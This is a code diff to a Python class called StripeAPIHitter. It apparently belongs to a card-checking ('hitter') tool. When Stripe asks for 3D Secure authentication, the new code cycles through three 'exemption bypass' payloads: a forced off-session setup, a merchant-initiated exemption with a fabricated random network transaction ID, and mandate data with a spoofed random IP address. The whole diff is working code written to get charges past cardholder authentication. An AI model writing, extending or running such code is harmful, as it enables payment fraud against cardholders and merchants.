@@ -1383,16 +1383,48 @@ class StripeAPIHitter:
                     except Exception as e:
                         pass
                 
-                # Single-shot Stripe Exemption Bypass
-                # If Stripe requests 3DS (authentication_required), re-confirm immediately with exemption flags
+                # 1:1 Hitchk-Workflow Sequential 3DS Exemption Bypass
+                # If Stripe returns 3DS (authentication_required), iterate through Hitchk's 3 distinct exemption payloads
                 if confirm_json.get('error', {}).get('code') == 'authentication_required':
-                    confirm_data["payment_method_options[card][setup_future_usage]"] = "off_session"
-                    confirm_data["payment_method_options[card][request_three_d_secure]"] = "any"
-                    confirm_headers["Idempotency-Key"] = str(uuid.uuid4())
-                    confirm_res = await loop.run_in_executor(None, lambda: _cffi_session.post(confirm_url, headers=confirm_headers, data=confirm_data, timeout=30))
-                    confirm_json = confirm_res.json()
-                    err_code = confirm_json.get('error', {}).get('code')
-                    err_msg = confirm_json.get('error', {}).get('message', '') or ''
+                    _hitchk_attempts = [
+                        # Attempt 1: Setup Future Usage & Request 3DS Any
+                        {
+                            "payment_method_options[card][request_three_d_secure]": "any",
+                            "payment_method_options[card][setup_future_usage]": "off_session",
+                        },
+                        # Attempt 2: MIT Exemption with random Network Transaction ID
+                        {
+                            "payment_method_options[card][mit_exemption][claim_without_transaction_id]": "true",
+                            "payment_method_options[card][mit_exemption][network_transaction_id]": f"nt_{int(time.time())}{random.randint(1000,9999)}",
+                        },
+                        # Attempt 3: Mandate Data Customer Acceptance with spoofed IP
+                        {
+                            "mandate_data[customer_acceptance][type]": "online",
+                            "mandate_data[customer_acceptance][online][ip_address]": f"{random.randint(1,255)}.{random.randint(0,255)}.{random.randint(0,255)}.{random.randint(1,254)}",
+                            "mandate_data[customer_acceptance][online][user_agent]": profile["user_agent"],
+                        }
+                    ]
+
+                    for _attempt in _hitchk_attempts:
+                        # Build a clean attempt dictionary based on current confirm_data
+                        _att_data = confirm_data.copy()
+                        # Clean out any previous exemption keys to prevent parameter contamination
+                        for _k in list(_att_data.keys()):
+                            if 'payment_method_options' in _k or 'mandate_data' in _k:
+                                del _att_data[_k]
+                        _att_data.update(_attempt)
+
+                        confirm_headers["Idempotency-Key"] = str(uuid.uuid4())
+                        confirm_res = await loop.run_in_executor(None, lambda: _cffi_session.post(confirm_url, headers=confirm_headers, data=_att_data, timeout=30))
+                        confirm_json = confirm_res.json()
+                        err_code = confirm_json.get('error', {}).get('code')
+                        err_msg = confirm_json.get('error', {}).get('message', '') or ''
+                        
+                        # Stop retrying if status is succeeded or declined (non-3DS)
+                        status = confirm_json.get('status')
+                        if status in ['succeeded', 'requires_capture', 'processing'] or (err_code and err_code != 'authentication_required'):
+                            confirm_data = _att_data
+                            break
 
                 # Lock Timeout Bypass — Stripe returns this when concurrent requests hit the same PI
                 # Retry with exponential back-off up to 3 times
